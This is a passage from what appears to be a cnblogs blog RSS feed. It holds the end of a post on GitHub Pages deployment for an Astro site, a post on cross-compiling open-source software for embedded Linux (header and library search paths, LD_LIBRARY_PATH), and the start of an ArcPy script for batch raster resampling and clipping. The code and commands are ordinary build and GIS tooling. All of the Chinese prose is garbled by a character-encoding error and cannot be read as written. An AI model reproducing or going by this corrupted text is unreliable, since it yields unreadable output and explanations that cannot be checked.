<p>ä½ éè¦åè¯ GitHubï¼âä¸è¦ç¨ Jekyll è¿è¡æçç½ç«ï¼ç´æ¥ææçæä»¶åæ ·ååºå»âã</p>
</blockquote>
<p>æä½æ­¥éª¤ï¼</p>
<ol>
<li>å¨ä½ ç gh-pages åæ¯çæ ¹ç®å½ä¸ï¼åå»ºä¸ä¸ªåä¸º .nojekyll çç©ºæä»¶ï¼æ³¨æåé¢æä¸ä¸ªç¹ï¼ã</li>
<li>æäº¤å¹¶æ¨éã</li>
</ol>
<h2 id="è§£å³æ¹æ¡2">è§£å³æ¹æ¡2</h2>
<p>ä¿®æ¹ä»£ç , éç½®éæèµæºæå¨çä½ç½®, ä¿®æ¹<code>astro.config.mjs</code>æä»¶åå®¹:</p>
<pre><code>diff --git a/landing-page/astro.config.mjs b/landing-page/astro.config.mjs
index 1ae7417..b1f04c3 100644
--- a/landing-page/astro.config.mjs
+++ b/landing-page/astro.config.mjs
@@ -7,5 +7,6 @@ export default defineConfig({
   site: 'https://xuhe2.github.io/sharelatex-ce/',
   build: {
     format: 'directory',
+    assets: 'assets',
   },
 });
</code></pre>
<h1 id="åèæç®">åèæç®</h1>
<p>å®æ¹ææ¡£: <a href="https://docs.github.com/en/pages/getting-started-with-github-pages/what-is-github-pages" target="_blank" rel="noopener nofollow">https://docs.github.com/en/pages/getting-started-with-github-pages/what-is-github-pages</a></p>
</div>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-15 21:52">2026-02-15 21:51</span>&nbsp;
<a href="https://www.cnblogs.com/xuhe2">xuhe2</a>&nbsp;
éè¯»(<span id="post_view_count">39</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19618589);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19618589', targetLink: 'https://www.cnblogs.com/xuhe2/p/19618589', title: 'Claude CodeéåAstro + GitHub Pagesï¼ä¸º sharelatex-ce æé ç°ä»£åçå¼æºé¡¹ç®å®£ä¼ é¡µ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ åµå¥å¼Linuxæå¨äº¤åç¼è¯å¼æºè½¯ä»¶éè¦æ³¨æçé®é¢ ]]></title>
    <link>https://www.cnblogs.com/ttkwzyttk/p/19618661</link>
    <guid>3e3f6014777c3555d4d45ec659b2514d</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ttkwzyttk/p/19618661" title="åå¸äº 2026-02-15 20:48">
    <span role="heading" aria-level="2">åµå¥å¼Linuxæå¨äº¤åç¼è¯å¼æºè½¯ä»¶éè¦æ³¨æçé®é¢</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        è¯¥æç« ä¸»è¦æå°äºä¸äºå¸¸è§çç¼è¯éè¯¯åå¶è§£å³æ¹æ¡ï¼å¹¶æä¾äºä¸äºæä½³å®è·µï¼å¸®å©å¼åèé¿åç¼è¯è¿ç¨ä¸­çé·é±ãéè¿è¿äºå»ºè®®ï¼è¯»èè½å¤æ´é«æå°è¿è¡åµå¥å¼Linuxå¼åï¼åå°ç¼è¯åè°è¯çæ¶é´ã
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>å¨åµå¥å¼Linuxçå¼åè¿ç¨ä¸­ï¼æä»¬ç»å¸¸éè¦ç¨å°ä¸äºè½¯ä»¶åºæèæ¯æµè¯å·¥å·ï¼è¿äºåºåå·¥å·å¤§æ¦çé½æ¯x86å¹³å°ä¸å¼åçï¼å°±éè¦æä»¬éè¿å¯¹æºç è¿è¡äº¤åç¼è¯ï¼çæè½å¤å¨å¼åæ¿ä¸ä½¿ç¨çè½¯ä»¶åå¨æåºã</p>
<p>å¯¹äºæäºå¼æºè½¯ä»¶è¿è¡ç¼è¯æä¸¤ç§æåµï¼ç¬¬ä¸ç§æ¯å¦ææä»¬ä½¿ç¨buildrootæ ¹æä»¶ç³»ç»ï¼å¯ä»¥å¨buildrootç<code>menuconfig</code>ç¼è¯èåä¸­ï¼å¾éç¸åºçè½¯ä»¶ï¼éæ°ç¼è¯æ ¹æä»¶ç³»ç»ï¼ç¼è¯å®æä¹åè¯¥æ ¹æä»¶ç³»ç»å°±ä¼èªå¨å¸¦ä¸å¯¹åºçåºåå¯æ§è¡ç¨åºï¼ç¬¬äºç§æ¯buildrootä¸­æ æ³æ¾å°æä»¬éè¦çè½¯ä»¶ï¼è¿ç§æåµä¸ï¼åªè½å¤è¿è¡æå¨äº¤åç¼è¯ï¼æ¥ä¸å·ä½è®²è§£ä¸æå¨äº¤åç¼è¯å¼æºè½¯ä»¶å¯è½éå°çä¸äºé®é¢</p>
<h1 id="ä¸ä½¿ç¨äº¤åç¼è¯å·¥å·é¾æ¶å¸¸è§é®é¢">ä¸ãä½¿ç¨äº¤åç¼è¯å·¥å·é¾æ¶å¸¸è§é®é¢</h1>
<h2 id="11-ç¼è¯è¿ç¨ä¸­å¤´æä»¶ç¸å³é®é¢">1.1 ç¼è¯è¿ç¨ä¸­å¤´æä»¶ç¸å³é®é¢</h2>
<p>äº¤åç¼è¯æ¶æä»¬å¯è½ä¼éå°æ¾ä¸å°å¤´æä»¶çé®é¢ï¼æä»¬é½ç¥éå¨x86å¹³å°ä¸å¼åç¨åºï¼ç¨åºä¸­éè¿å°æ¬å·çæ¹å¼åå«å¤´æä»¶ï¼<code>#include &lt;xxx.h&gt;</code>ä»ä¼å°ç³»ç»ç®å½ä¸å»æ¥æ¾æéè¦çå¤´æä»¶ï¼ä¸è¬æåµå¨<code>/usr/include</code>æè<code>/usr/local/include</code>è·¯å¾ä¸ï¼é£ä¹å¯¹äºæä»¬çäº¤åç¼è¯å·¥å·çç³»ç»ç®å½åæ¯åªéå¢ï¼æä»¬å¯ä»¥éè¿ä»¥ä¸å½ä»¤æ¥æ¥çå½åäº¤åç¼è¯å·¥å·å¯¹åºç<code>include</code>ç³»ç»è·¯å¾å¨åª</p>
<pre><code class="language-c">echo 'main(){}' | &lt;äº¤åç¼è¯å·¥å·&gt; -E -v -
</code></pre>
<p>è¿ä¸ªå½ä»¤å©ç¨ <code>gcc</code> çé¢å¤çï¼<code>-E</code>ï¼åè¯¦ç»è¾åºï¼<code>-v</code>ï¼åè½ï¼å¸®å©æ¥çç¼è¯å¨æ¥æ¾å¤´æä»¶ååºæä»¶çè·¯å¾ãéç¨äºè°è¯åçè§£äº¤åç¼è¯å¨çå·¥ä½åçï¼å°¤å¶æ¯å¨å¤çä¸åå¹³å°åå·¥å·é¾æ¶ãä¸é¢å¨æçå¹³å°ä¸­ä¸¾ä¾ï¼æä½¿ç¨rk3576çSDKä¸­èªå¸¦çäº¤åç¼è¯å·¥å·ï¼æ§è¡å¦ä¸å½ä»¤ä¹åï¼è¾åºç»æå¦ä¸å¾æç¤º<br>
<img src="https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541237-2069199422.png" alt="Pasted image 20260215184437.png" loading="lazy"><br>
å¯ä»¥çè§ï¼è¯¥å½ä»¤å°<code>#include ""</code>å<code>#include &lt;&gt;</code>ä¼æ¥æ¾çè·¯å¾é½æå°äºåºæ¥ï¼å¯¹äºæºæä»¶ä¸­éè¿<code>#include ""</code>çå¤´æä»¶ï¼è¯¥ç¼è¯å¨ä¼å°æºæä»¶å½åè·¯å¾ä¸æ¥æ¾ï¼å¯¹ä¸åæä»¶ä¸­éè¿<code>#include &lt;&gt;</code>çå¤´æä»¶ï¼<code>aarch64-none-linux-gnuu-gcc</code>ç¼è¯å¨ä¼å»ä»¥ä¸ä¸ä¸ªè·¯å¾ä¸­å»æ¥æ¾ï¼èä¸æ¯x86å¹³å°ä¸çç³»ç»è·¯å¾ä¸­å»æ¥æ¾ãå¦æå¨æä»¬äº¤åç¼è¯è¿ç¨ä¸­ï¼ç¼ºå°æäºå¤´æä»¶ï¼æä»¬å°±å¯ä»¥æå¯¹åºå¤´æä»¶æ·è´å°è¿äºç®å½ä¸­å»ï¼æ¾å°ä»»æä¸ä¸ªè·¯å¾ä¸å°±è¡ã</p>
<pre><code class="language-shell">/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/../lib/gcc/aarch64-none-linux-gnu/10.3.1/include  
/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/../lib/gcc/aarch64-none-linux-gnu/10.3.1/include-fixed  
/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/../lib/gcc/aarch64-none-linux-gnu/10.3.1/../../../../aarch64-none-linux-gnu/inclu  
de
</code></pre>
<p>é¤äºä¸é¢è¿ç§æ¹æ³ï¼ä¹å¯ä»¥ç´æ¥å¨ç¼è¯æºæä»¶çæ¶åå¨åé¢å ä¸<code>-v</code>éé¡¹æ¥çè¯¦ç»çç¼è¯ä¿¡æ¯ï¼ä¾å¦æè¿éç¼è¯ä¸ä¸ªusbç¸å³çåºç¨ç¨åºï¼ä¸é¢æ¯ææ§è¡äº¤åç¼è¯çå½ä»¤ï¼åé¢å ä¸äº<code>-v</code>æ¥æ¾ç¤ºå·ä½çç¼è¯ä¿¡æ¯</p>
<pre><code class="language-shell">/home/wzy/sdk/rk3576_linux6.1.99_release-rkr5/prebuilts/gcc/linux-x86/aarch64/gcc-arm-10.3-2021.07-x86_64-aarch64-none-linux-gnu/bin/aarch64-none-linux-gnu-gcc usb1.c -o usb1 -v
</code></pre>
<p>æ§è¡ç»æå¦ä¸<br>
<img src="https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541189-1040648713.png" alt="Pasted image 20260215203358.png" loading="lazy"><br>
è¿éå¯ä»¥çè§ä¸é¢æè®²çäº¤åç¼è¯å·¥å·çå¤´æä»¶ç³»ç»è·¯å¾ï¼åæ¶ä¹æ¥åºä¸ä¸ªéè¯¯ï¼æ æ³æ¾å°<code>libusb.h</code>æä»¶ï¼å ä¸ºææ²¡æå§å¯¹åºå¤´æä»¶æ·è´å°çº¢æ¡ä¸­çä»»ä½ä¸ä¸ªå¤´æä»¶è·¯å¾ä¸­å»ï¼ä¹æ²¡æéè¿<code>-I</code>å½ä»¤æå¨æå®ãæ¥ä¸æ¥æå°éè¿æå¨æå®çæ¹å¼æ¥å±ç¤ºå äºè¿ä¸ªéé¡¹ä¹åçååã</p>
<p>ä¸é¢æå°äºé¤äºä½¿ç¨ç³»ç»ç®å½å¤ï¼ä¹å¯ä»¥èªå·±æå®ç®å½ï¼ç¼è¯æ¶ç¨<code>-I&lt;path&gt;</code>éé¡¹æå®ãç¼è¯æ¶ï¼ç¼è¯å¨ä¼ä¼åä½¿ç¨éè¿<code>-I</code>æå®çè·¯å¾ï¼å ä¸ºå¦ææå®äº<code>-I</code>éé¡¹ï¼è¯¥éé¡¹çè·¯å¾ä¼æ¾å°æåé¢ï¼æ¥çä¸é¢çæ¥éï¼æå å¥äº<code>-I</code>éé¡¹ä¹å<br>
<img src="https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541172-1625023185.png" alt="Pasted image 20260215203743.png" loading="lazy"><br>
å¯ä»¥çè§<code>-I</code>éé¡¹æå®çè·¯å¾ä¼åçº§æå°äºæåé¢</p>
<h2 id="12-ç¼è¯è¿ç¨ä¸­åºæä»¶é®é¢">1.2 ç¼è¯è¿ç¨ä¸­åºæä»¶é®é¢</h2>
<p>å¨äº¤åç¼è¯é¾æ¥ç¨åºæ¶å¦ææè¿æ ·çæç¤ºï¼<code>undefined reference to xxx</code>ï¼å®è¡¨ç¤º <code>xxx</code> å½æ°æªå®ä¹ãåºç°è¿ä¸ªéè¯¯ä¸»è¦æ¯æä¸¤ç§æåµï¼ç¬¬ä¸å°±æ¯äº¤åç¼è¯å·¥å·çç³»ç»åºæä»¶è·¯å¾ä¸­æ²¡æç¸åºçåºï¼ç¬¬äºå°±æ¯ç¼è¯æºç ä½¿ç¨çåºççæ¬åå½åç³»ç»ä¸­åºççæ¬ä¸åï¼åºçå·®å¼å¯¼è´æ¥éãè§£å³æ¹æ³è¦ä¹å»ååºè¿ä¸ªå½æ°ï¼ææ¯ä½¿ç¨åºå½æ°ï¼é£éè¦å¨é¾æ¥æ¶æå®åºãé£ä¹æä»¬å¦ä½ç¡®å®äº¤åç¼è¯å·¥å·å¯¹åºçç³»ç»åºæä»¶å¨åªéï¼åæ ·æ§è¡ç¸åå½ä»¤ç¡®å®ç®å½</p>
<pre><code class="language-c">echo 'main(){}' | &lt;äº¤åç¼è¯å·¥å·&gt; -E -v -
</code></pre>
<p>å½ç¶ä¹å¯ä»¥å¨ç¼è¯å½ä»¤åå ä¸<code>-v</code>éé¡¹<br>
<img src="https://img2024.cnblogs.com/blog/2652772/202602/2652772-20260215204541242-413123482.png" alt="Pasted image 20260215185448.png" loading="lazy"><br>
å¯ä»¥çå°çº¢æ¡é¨åæå°åºäº<code>LIBRARY_PATH</code>è¿ä¸ªå®ï¼è¿ä¸ªå®å°±è¡¨ç¤ºçæ¯äº¤åç¼è¯å·¥å·å¨é¾æ¥æ¶ï¼ä¼å°è¿äºè·¯å¾ä¸å»æ¥æ¾åºæä»¶ï¼å½æä»¬ç¼ºå°åºæä»¶æ¶ï¼å¯ä»¥å°åºæä»¶æ·è´å°è¿äºç®å½ä¸çä»»æä¸ä¸ªè·¯å¾å°±è¡ï¼åæ ·æä»¬ä¹å¯ä»¥èªå·±æå®é¾æ¥åºçè·¯å¾ï¼é¾æ¥æ¶ç¨<code>-L&lt;path&gt;</code>éé¡¹æå®ï¼ç¼è¯æ¶ï¼ç¼è¯å¨ä¼ä¼åä½¿ç¨éè¿<code>-L</code>æå®çè·¯å¾</p>
<p>å½æä»¬å·²ç»å°éè¦é¾æ¥çåºæ·è´å°å¯¹åºçç³»ç»åºæä»¶è·¯å¾ä¸ä¹åï¼æèæä»¬å·²ç»éè¿<code>-L</code>éé¡¹æå®äºåºè·¯å¾ä¹åï¼æä»¬æ³è¦é¾æ¥åºåºè¯¥å¦ä½æä½ï¼ä¾å¦æä»¬æ³è¦é¾æ¥<code>libpthread.so</code>ï¼é£ä¹æä»¬å¨ç¼è¯é¾æ¥æ¶å°±éè¦å ä¸<code>-lpthread</code>çç¼è¯éé¡¹ãå°±å¯ä»¥æ­£å¸¸ç¼è¯ç¨åºäºã</p>
<p>å°æ­¤ï¼æä»¬å·²ç»ç¥éäºï¼ç¼è¯ä¸ä¸ªå¼æºè½¯ä»¶æ¶ï¼å¦æåºç°äºé®é¢ï¼åºè¯¥å¦ä½æ¥æ¾äº¤åç¼è¯å·¥å·çå¤´æä»¶è·¯å¾ååºæä»¶è·¯å¾ï¼ä¸»è¦ç¨æ¥å¤çä¸äºå¼æºè½¯ä»¶ç¼è¯è¿ç¨ä¸­ï¼ä¾èµç¼ºå¤±çé®é¢ï¼ä¾å¦æç°å¨éè¦ç¼è¯ä¸ä¸ªè½¯ä»¶ï¼ä½æ¯ç¼ºå°å¶ä»è½¯ä»¶çåºä¾èµï¼é£ä¹æä»¬å°±éè¦åäº¤åç¼è¯ä¾èµåºï¼ç¶åå°ç¼è¯åºæ¥çåºä»¥åå¯¹åºå¤´æä»¶æ·è´å°äº¤åç¼è¯å·¥å·å¯¹åºçå¤´æä»¶ååºæä»¶çç³»ç»ç®å½ä¸ï¼åç¼è¯æä»¬çç®æ è½¯ä»¶ï¼è¿ééè¦æ³¨æçä¸ç¹å°±æ¯ï¼ç¼è¯åºæ¥ç<code>lib</code>æä»¶ï¼æä¸äºå¯è½æ¯ä¸ä¸ªåºè½¯è¿æ¥å°äºå¦ä¸ä¸ªåºä¸ï¼æä»¥å¨æ·è´çæ¶åéè¦ä½¿ç¨<code>cp -drf</code>å½ä»¤æ¥æ·è´ï¼é¿åç ´åè½¯è¿æ¥</p>
<p>é£ä¹éè¿<code>-I</code>å<code>-L</code>æå®è·¯å¾ä¸å°ä¾èµå¤´æä»¶ä¸åºæ·è´å°å·²æçè·¯å¾ä¸­ï¼æä»ä¹åºå«ï¼åºå«å°±æ¯å¦æä½¿ç¨æå®è·¯å¾çæ¹å¼ï¼å¨æ¯æ¬¡ç¼è¯çæ¶åé½éè¦éæ°è¾ä¸éè·¯å¾ï¼è¿å¯¹äºåªç¨ç¼è¯ä¸æ¬¡çææ¯è¿è¡ï¼å¦ææ¯ä¹åçåºç¨å¼åä¼ç»å¸¸ç¨å°è¿ä¸ªåºï¼è¿æ¯å»ºè®®å°åºæ·è´å°äº¤åç¼è¯å¨é»è®¤çç³»ç»åºåå¤´æä»¶è·¯å¾ä¸­å»ï¼é¿åæ¯æ¬¡ç¼è¯çæ¶åé½éæ°æ²ä¸éè·¯å¾ã</p>
<h2 id="13-è¿è¡è¿ç¨ä¸­æ¾ä¸å°åºç¸å³é®é¢">1.3 è¿è¡è¿ç¨ä¸­æ¾ä¸å°åºç¸å³é®é¢</h2>
<p>å¦æå¨æ§è¡å¯æ§è¡ç¨åºçæ¶åï¼åºç°æ¾ä¸å°æååºçé®é¢ï¼è¯´æå½åçç³»ç»åºè·¯å¾ä¸ç¼ºå°è¿ä¸ªåºï¼åªéè¦å°è¿è¡éè¦çåºï¼æ·è´å°å¯¹åºçé¾æ¥åºç®å½ä¸å°±è½è§£å³è¿ä¸ªé®é¢</p>
<pre><code class="language-shell">error while loading shared libraries: libxxx.so:
cannot open shared object file: No such file or directory
</code></pre>
<p>å¯¹åºçç³»ç»åºè·¯å¾å¨åªï¼ä¸è¬ç³»ç»ç®å½å°±æ¯æ¿å­ä¸ç<code>/lib</code>ã<code>/usr/lib</code>ç®å½ï¼å½åä¹å¯ä»¥èªå·±æå®ï¼è¿è¡ç¨åºç¨ç¯å¢åé <code>LD_LIBRARY_PATH</code> æå®ï¼æ§è¡ä»¥ä¸çå½ä»¤æ¥æ·»å ä¸ä¸ªæ°çåºè·¯å¾</p>
<pre><code class="language-shell">export LD_LIBRARY_PATH=/xxx_dir
</code></pre>
<p>ç¨åºè¿è¡æ¶ï¼å¹¶ä¸éè¦å¤´æä»¶ï¼å¦æä¸å¨å¼åæ¿ä¸ç¼è¯ï¼é£ä¹å¤´æä»¶ä¸ç¨æ·è´å°å¼åæ¿ä¸</p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.004166666666666667" data-date-updated="2026-02-15 20:54">2026-02-15 20:48</span>&nbsp;
<a href="https://www.cnblogs.com/ttkwzyttk">ttkwzyttk</a>&nbsp;
éè¯»(<span id="post_view_count">26</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19618661);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19618661', targetLink: 'https://www.cnblogs.com/ttkwzyttk/p/19618661', title: 'åµå¥å¼Linuxæå¨äº¤åç¼è¯å¼æºè½¯ä»¶éè¦æ³¨æçé®é¢' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ ä½¿ç¨ ArcPy æ¹éå¤çæ æ ¼æ°æ®ï¼ééæ ·ä¸ç¢éè£åª ]]></title>
    <link>https://www.cnblogs.com/Laurentianelle/p/19618450</link>
    <guid>c6f5ef8d0ab741f32bdd9e590cd59d9a</guid>
    <description>
    <![CDATA[ 
	<h1 class="postTitle"><a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/Laurentianelle/p/19618450" title="åå¸äº 2026-02-15 18:19">
    <span role="heading" aria-level="2">ä½¿ç¨ ArcPy æ¹éå¤çæ æ ¼æ°æ®ï¼ééæ ·ä¸ç¢éè£åª</span>
    

</a>
</h1>
	<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="ä½¿ç¨-arcpy-æ¹éå¤çæ æ ¼æ°æ®ééæ ·ä¸ç¢éè£åª">ä½¿ç¨ ArcPy æ¹éå¤çæ æ ¼æ°æ®ï¼ééæ ·ä¸ç¢éè£åª</h1>
<h2 id="èæ¯ä»ç»">èæ¯ä»ç»</h2>
<p>å¨å°çä¿¡æ¯ç³»ç»ï¼GISï¼å·¥ä½ä¸­ï¼æä»¬å¸¸å¸¸éè¦å¤çå¤§éæ æ ¼å¾åæä»¶ï¼æ¯å¦å«æé¥ææ°æ®ãè¿äºæä»¶åè¾¨çä¸ä¸ãè¦çèå´è¿å¤§ï¼ç´æ¥ä½¿ç¨ä¼è®©åæå¡é¡¿æè¶åºç ç©¶åºãè¿æ¶ï¼ä¸ä¸ªèªå¨åèæ¬å°±è½å¸®å¿ï¼å®åä¸ä¸ªâæºè½è£ç¼âï¼æ¹éå°æä»¶âè£åªâå°åéå¤§å°ååè¾¨çï¼è®©æ°æ®æ´ç²¾ç¼æç¨ã</p>
<p>è¿ä¸ªèæ¬éå¯¹ç¼ç¨æ°æè®¾è®¡ï¼åªéç®åéç½®ï¼å°±è½å¤çæå çTIFæä»¶ãç¹å«éååå­¦èç»ä¹ ArcPyï¼å¿«éä¸æGISèªå¨åã</p>
<h2 id="ä»£ç åè½è¯´æ">ä»£ç åè½è¯´æ</h2>
<p>è¿ä¸ªèæ¬çæ ¸å¿ç¨éæ¯<strong>æ¹éå¤çæ æ ¼TIFæä»¶</strong>ï¼è§£å³æå¨ééæ ·åè£åªèæ¶è´¹åççç¹ãå®ä¼èªå¨æ«æè¾å¥æä»¶å¤¹ä¸­çææTIFæä»¶ï¼æå¹´ä»½åç»ï¼ééæ ·å°30ç±³åè¾¨çï¼ç¶åç¨æå®çç¢éè¾¹çï¼SHPæä»¶ï¼è£åªï¼åªä¿çæå´è¶£åºåï¼æç»ä¿å­ä¸ºæ°TIFæä»¶ã</p>
<p>éç¨åºæ¯åæ¬ï¼å°é¢æ²éçæµãåå°å©ç¨åååæãç¯å¢è¯ä¼°é¡¹ç®ââä»»ä½éè¦ç»ä¸åè¾¨çååºåçé¥ææ°æ®å¤çãè¿è¡åï¼ä½ ä¼å¨ç»ç«¯çå°è¿åº¦æç¤ºå¦âð [1/10] å¤çæä»¶: xxx.tifï¼å¹´ä»½: 2020ï¼âåââ å®æï¼xxx.tifâï¼è¾åºæä»¶å¤¹ä¸­åºç°æå¹´ä»½å½åçè£åªåTIFæä»¶ï¼è¿äºæä»¶ä½ç§¯æ´å°ãè¾¹çç²¾ç¡®ï¼éæ¶å¯å¯¼å¥ArcGISæ¥çæè¿ä¸æ­¥åæã</p>
<h2 id="è¿è¡ç¯å¢åå¤">è¿è¡ç¯å¢åå¤</h2>
<p>åå¤ç¯å¢å°±åä¸ºå¨å¸å¤é½éç¢ç¢çï¼ç¡®ä¿èæ¬è½é¡ºå©âä¸å¨âãä¸ºä»ä¹è¦åè¿ä¸æ­¥ï¼å ä¸ºArcPyä¾èµArcGISè½¯ä»¶ï¼æ²¡æå®èæ¬å°±âæ ç±³ä¸éâã</p>
<ul>
<li><strong>ArcGIS çæ¬è¦æ±</strong>ï¼ArcGIS Desktop 10.5+ æ ArcGIS Pro 2.5+ï¼æ¨è Proï¼æ´ç¨³å®ï¼ã
<ul>
<li>æ£æ¥æ¹æ³ï¼æå¼ArcGISï¼æ¥çâå¸®å© &gt; å³äºâä¸­ççæ¬ä¿¡æ¯ãå¦ææ²¡æï¼ä¸è½½å®è£ä» <a href="https://www.esri.com/en-us/arcgis/products" target="_blank" rel="noopener nofollow">esri.com</a>ã</li>
</ul>
</li>
<li><strong>Python ç¯å¢</strong>ï¼ä½¿ç¨ArcGISèªå¸¦çPythonï¼éå¸¸3.9+ï¼ï¼æ éé¢å¤å®è£ã</li>
<li><strong>Spatial Analyst æ©å±</strong>ï¼èæ¬éæ­¤æ©å±ç¨äºæ æ ¼å¤çã
<ul>
<li>æææ£æ¥ï¼å¨ArcGISä¸­ï¼å·¥å·ç®± &gt; Spatial Analyst Toolsï¼ç¡®ä¿å¯ç¨ã</li>
</ul>
</li>
<li><strong>æä»¶åå¤</strong>ï¼ç¡®ä¿è¾å¥TIFæä»¶åSHPè¾¹çæä»¶å­å¨ï¼ç¡¬çæè¶³å¤ç©ºé´ï¼æ¯ä¸ªTIFå¤çå¯è½éå ç¾MBï¼ã</li>
</ul>
<p>è¿äºåå¤å¥½ï¼èæ¬å°±è½å¨ArcGIS Pythonç¯å¢ä¸­è¿è¡ã</p>
<h2 id="è¯¦ç»è¿è¡æ­¥éª¤">è¯¦ç»è¿è¡æ­¥éª¤</h2>
<p>æä»¬æé¡ºåºæè§£è¿è¡ï¼åæ­ä¹é«ä¸æ ·ä¸æ­¥æ­¥æ¥ãæ¯æ­¥è§£éâä¸ºä»ä¹âï¼å¸®ä½ çè§£é»è¾ï¼è¿æ ·ä¸æ¯æ­»è®°ç¡¬èï¼èæ¯ç¥éâä¸ºä»ä¹è¿æ ·æ­æ´ç¨³âã</p>
<ol>
<li>
<p><strong>ç¯å¢åå¤</strong>ï¼<br>
ä¸ºä»ä¹ï¼ç¡®è®¤å·¥å·å°±ä½ï¼é¿åè¿è¡æ¶çªç¶æ¥âç¼ºè´§âã</p>
<ul>
<li>å¯å¨ArcGIS Pro æ Desktopï¼ç¡®ä¿Spatial Analystæ©å±å·²ææï¼å¨âé¡¹ç® &gt; è®¸å¯ &gt; æ©å±âä¸­å¾éï¼ã</li>
<li>åå¤æ°æ®ï¼å°ä½ çTIFæä»¶æ¾å¥ä¸ä¸ªä¸»æä»¶å¤¹ï¼å¦åå«å¹´ä»½å­æä»¶å¤¹çâdataâï¼ï¼SHPæä»¶åç¬ä¿å­ã</li>
</ul>
</li>
<li>
<p><strong>ä¾èµå®è£</strong>ï¼<br>
ä¸ºä»ä¹ï¼èæ¬ç¨å°çåºå¤§å¤åç½®ï¼ä½ç¡®è®¤æ è¯¯è½é²å°é®é¢ã</p>
<ul>
<li>ArcPy å os/re/glob æ¯æ ååºï¼æ épipã</li>
<li>å¨ArcGIS Python Command Promptï¼ä»å¼å§èåæç´¢ï¼ä¸­è¾å¥ <code>python -c "import arcpy; print('OK')"</code> æµè¯ArcPyæ¯å¦å¯ç¨ãå¦ææ¥éï¼éå¯ArcGISã</li>
</ul>
</li>
<li>
<p><strong>ä»£ç ä¿®æ¹</strong>ï¼<br>
ä¸ºä»ä¹ï¼èæ¬è·¯å¾æ¯ç¤ºä¾ï¼æ¢æä½ çæè½âå¯¹å·å¥åº§âï¼å¦åæ¾ä¸å°æä»¶ã</p>
<ul>
<li>æ°å»ºææ¬æä»¶ï¼å½åä¸º <code>batch_raster_process.py</code>ï¼å¤å¶ä¸æ¹ä»£ç åç²è´´ã</li>
<li>ç¨è®°äºæ¬æVS Codeæå¼ï¼ä¿®æ¹åæ°é¨åï¼
<ul>
<li><strong>æ³¨æï¼è¿è¡åéä¿®æ¹</strong> <code>input_root_folder = r"ãyour_input_rootã"</code> ä¸ºä½ çTIFä¸»æä»¶å¤¹è·¯å¾ï¼ä¾å¦ <code>r"C:\GISData\æ²éæ°æ®"</code>ã</li>
<li><strong>æ³¨æï¼è¿è¡åéä¿®æ¹</strong> <code>mask_shp = r"ãyour_mask_shpã"</code> ä¸ºSHPè¾¹çè·¯å¾ï¼ä¾å¦ <code>r"C:\GISData\study_area.shp"</code>ã</li>
<li><strong>æ³¨æï¼è¿è¡åéä¿®æ¹</strong> <code>output_folder = r"ãyour_output_folderã"</code> ä¸ºè¾åºè·¯å¾ï¼ä¾å¦ <code>r"C:\Output\processed"</code>ã</li>
<li>å¯éï¼è°æ´ <code>cell_size = 30</code> ä¸ºä½ çç®æ åè¾¨çï¼ç±³ï¼ã</li>
</ul>
</li>
<li>ä¿å­ä¸ºUTF-8ç¼ç ã</li>
</ul>
<pre><code class="language-python">import arcpy
import os
import re
import glob

# === åæ°è®¾å® ===
input_root_folder = r"ãyour_input_rootã"          # åå«å¤ä¸ªå¹´ä»½å­æä»¶å¤¹çä¸»ç®å½
mask_shp = r"ãyour_mask_shpã"                     # ç¨äºè£åªçé¢ç¢é
output_folder = r"ãyour_output_folderã"           # æç»è¾åºæä»¶å¤¹
cell_size = 30                                     # ç®æ åè¾¨çï¼ç±³ï¼
variable_name = "kuangshan4"                       # åéåä½ä¸ºè¾åºåç¼

# === ç¯å¢è®¾å® ===
arcpy.env.overwriteOutput = True
arcpy.CheckOutExtension("Spatial")

# ä¼°ç®å°çåæ ä¸ç 30 ç±³åè¾¨çï¼å¤§è´ï¼
cellsize_degree = 0.0002695

# åå»ºè¾åºæä»¶å¤¹
if not os.path.exists(output_folder):
    os.makedirs(output_folder)

# === æç´¢ææ.tifæä»¶ ===
tif_list = glob.glob(os.path.join(input_root_folder, "*", "*.tif"))
total_files = len(tif_list)
print(f"\nð¦ å±åç° {total_files} ä¸ª .tif æä»¶ï¼å¼å§å¤ç...\n")

# === éåå¤ç ===
for idx, tif_path in enumerate(tif_list, 1):
    filename = os.path.basename(tif_path)
    parent_folder = os.path.basename(os.path.dirname(tif_path))
   
    # æåå¹´ä»½
    year_match = re.search(r"\d{4}", parent_folder)
    year = year_match.group() if year_match else "unknown"
    print(f"ð [{idx}/{total_files}] å¤çæä»¶: {filename}ï¼å¹´ä»½: {year}ï¼")
   
